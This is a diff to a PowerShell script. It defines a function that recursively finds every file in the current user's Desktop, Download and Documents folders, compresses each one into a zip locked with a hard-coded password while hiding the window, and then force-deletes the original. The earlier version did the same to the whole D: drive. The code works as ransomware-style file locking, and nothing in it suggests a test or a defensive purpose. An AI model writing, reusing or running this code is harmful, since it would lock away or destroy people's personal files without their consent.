@@ -30,13 +30,31 @@ function file_to_zip([string]$FilesToZip, [string]$ZipOutputFilePath, [string]$P
         throw "There was a problem creating the zip file '$ZipFilePath'."
     }
 }
-$password = "r0!i9wm3l8hhlrmod0w&vv-?vp9f?2!1ebqdqe%k"
-$a = Get-ChildItem -Path "D:\" -Recurse -File
-for ($i = 0; $i -lt $a.Count; $i++) {
-    <# Action that will repeat until the condition is met #>
-    $temp = $a.FullName[$i] + ".zip" 
-    file_to_zip $a.FullName[$i] $temp -HideWindow -Password $password
-    Remove-Item -Path $a.FullName[$i] -Force
+function executer([string] $file, [string] $password){
+    $filepath = Get-ChildItem -Path $file -Recurse -File
+    for ($i = 0; $i -lt $filepath.Count; $i++) {
+        $bool = 0;
+        <# Action that will repeat until the condition is met #>
+        $temp = $filepath.FullName[$i] -replace ".{4}$"
+        $temp = $temp + ".zip" 
+        
+        file_to_zip -FilesToZip $filepath.FullName[$i] -ZipOutputFilePath $temp -HideWindow -Password $password
+        if ((Test-Path -Path $temp -PathType Leaf)){
+            Write-Output "zip file vvssen ban "
+            Remove-Item -Path $filepath.FullName[$i] -Force
+        }
+    }
 }
+$password = "r0!i9wm3l8hhlrmod0w&vv-?vp9f?2!1ebqdqe%k"
+$D = "D:\"
+$tpath_desk = "C:\Users\"+[System.Environment]::UserName+"\Desktop"
+$tpath_down = "C:\Users\"+[System.Environment]::UserName+"\Download"
+$tpath_docu = "C:\Users\"+[System.Environment]::UserName+"\Documents"
+
+#executer -filepath $D ;
+executer -file $tpath_desk -password $password;
+executer -file $tpath_down -password $password;
+executer -file $tpath_docu -password $password;
+
 
 
